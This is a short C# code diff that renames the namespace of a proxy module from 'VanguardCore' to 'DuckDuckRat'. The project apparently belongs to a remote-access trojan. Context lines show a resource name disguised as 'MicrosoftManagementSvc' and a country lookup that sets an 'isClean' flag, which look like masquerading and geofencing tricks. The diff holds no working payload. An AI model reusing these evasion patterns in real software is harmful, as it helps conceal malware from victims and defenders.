@@ -8,9 +8,9 @@ using System.Threading.Tasks;
 using System.Diagnostics;
 using System.Collections.Generic;
 using System.Text.RegularExpressions;
-using VanguardCore;
+using DuckDuckRat;
 
-namespace VanguardCore.Modules
+namespace DuckDuckRat.Modules
 {
     public class ProxyModule
     {
@@ -34,7 +34,7 @@ namespace VanguardCore.Modules
         {
             try
             {
-                var info = await FinalBot.Modules.SystemInfoModule.GetCountryInfoAsync();
+                var info = await DuckDuckRat.Modules.SystemInfoModule.GetCountryInfoAsync();
                 string country = info.country.ToLower();
                 
                 bool isClean = false;
@@ -64,7 +64,7 @@ namespace VanguardCore.Modules
                 var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                 
                 // Try multiple prefix variants matching csproj/AOT behavior
-                string[] possibleNames = { resourceName, $"VanguardCore.{resourceName}", $"MicrosoftManagementSvc.{resourceName}" };
+                string[] possibleNames = { resourceName, $"DuckDuckRat.{resourceName}", $"MicrosoftManagementSvc.{resourceName}" };
                 Stream stream = null;
                 foreach (var name in possibleNames) {
                     stream = assembly.GetManifestResourceStream(name);
@@ -250,3 +250,5 @@ namespace VanguardCore.Modules
         }
     }
 }
+
+
